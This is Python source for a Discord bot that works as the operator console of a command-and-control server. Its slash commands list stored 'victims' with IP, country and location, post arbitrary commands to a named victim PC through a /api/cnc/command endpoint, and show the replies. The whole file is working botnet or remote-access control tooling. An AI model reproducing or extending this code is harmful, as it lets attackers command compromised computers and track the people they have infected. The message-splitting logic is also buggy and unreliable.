import discord
from discord import app_commands
from discord.ext import commands
from icecream import ic
import requests
import io
import pprint
import ast

def process_for_pprint(data):
    # If the input is a string, convert it to a dictionary
    if isinstance(data, str):
        try:
            data = ast.literal_eval(data)
        except ValueError:
            return None

    # If the data is a dictionary, format it as a string with line breaks
    if isinstance(data, dict):
        output = ""
        for key, value in data.items():
            output += f"{key}: {value}\n"
        return output.strip()

    return None

def capture_pprint(data):
    data = process_for_pprint(data)
    buffer = io.StringIO()
    pprint.pprint(data, stream=buffer)
    output = buffer.getvalue()
    buffer.close()
    return output

prefix = '.'

class BOT:
    def __init__(self,db,URL="http://localhost:8000",prefix='.'):
        bot   = commands.Bot(command_prefix=prefix,intents=discord.Intents.all())
        self.bot = bot
        @bot.event
        async def on_ready():
            ic("BOT UP AND RUNNING")
            synced = await bot.tree.sync()
            ic(f"Synced: {synced}")
                
        @bot.tree.command(name="ping")
        async def ping(interaction:discord.Interaction):
            await interaction.response.send_message(f'Pong! {round(bot.latency * 1000)} ms')

        @bot.tree.command(name="show_victims")
        @app_commands.describe(show_all_info = "wether to show all the stored data on the victim or just the name")
        async def victims(interaction:discord.Interaction, show_all_info:bool=False):
            if show_all_info:
                info = db.return_all_victims_data()
                inf = '`ID Name IP Country Location`\n\n'
                for victim in info:
                    inf = inf +"`"+str(victim)+'`\n'
                info = inf
                
                if len(str(info)) > 2000:
                    try:
                        info1 = info[:len(info)//2]
                        info2 = info[:len(info)//2:]
                        await interaction.response.send_message(f'{str(info1)}')
                        await interaction.response.send_message(f'{str(info2)}')
                    except discord.errors.HTTPException:
                        await interaction.response.send_message("to many victims please use the web interface to view this")
                else:
                    await interaction.response.send_message(f'{str(info)}')

                    
            else:
                info = db.return_all_victims_names()
                inf = ''
                for victim in info:
                    inf = inf +"`"+str(victim[0])+'`\n'
                info = inf
                if len(str(info)) > 2000:
                    try:
                        info1 = info[:len(info)//2]
                        info2 = info[:len(info)//2:]
                        await interaction.response.send_message(f'{capture_pprint(str(info1))}')
                        await interaction.response.send_message(f'{capture_pprint(str(info2))}')
                    except discord.errors.HTTPException:
                        await interaction.response.send_message("to many victims please use the web interface to view this")
                else:
                    await interaction.response.send_message(f'{capture_pprint(str(info))}')

        @bot.tree.command(name="new_command")
        @app_commands.describe(command = "a command to send to the client",target = "the victim's pc name",parameter = "a paramater to the command NOT REQUOIRED")
        async def new_command(interaction:discord.Interaction,command:str,target:str,parameter:str or None =None):
            Data = {"command":command, "target":target, "parameter":str(parameter)}
            r    = requests.post(URL+"/api/cnc/command",json=Data)
            await interaction.response.send_message(f"```Status: {r.status_code}\nResponse: {r.text}```")
        
        @bot.tree.command(name="show_response")
        @app_commands.describe(command='the command you sent and want response to',name='the victim name')
        async def show_resp(interaction:discord.Interaction,command:str,name:str):
            resp = db.get_response(command,name)
            if resp:
                info =  f"**ResponseTime**: `{resp[1]}`\n**Command**: `{resp[2]}`\n**Result**:`{resp[4]}`\n**Response**:```{str(capture_pprint(resp[3]))}```"
                if len(str(info)) > 2000:
                    try:
                        info1 = info[:len(info)//2]
                        info2 = info[:len(info)//2:]
                        await interaction.response.send_message(f'{str(info1)}')
                        await interaction.response.send_message(f'{str(info2)}')
                    except discord.errors.HTTPException:
                        await interaction.response.send_message("response is too long please use the web interface to view this")
                else:
                    await interaction.response.send_message(f'{str(info)}')
            else:
                await interaction.response.send_message(f'No response found for {command} on {name}')
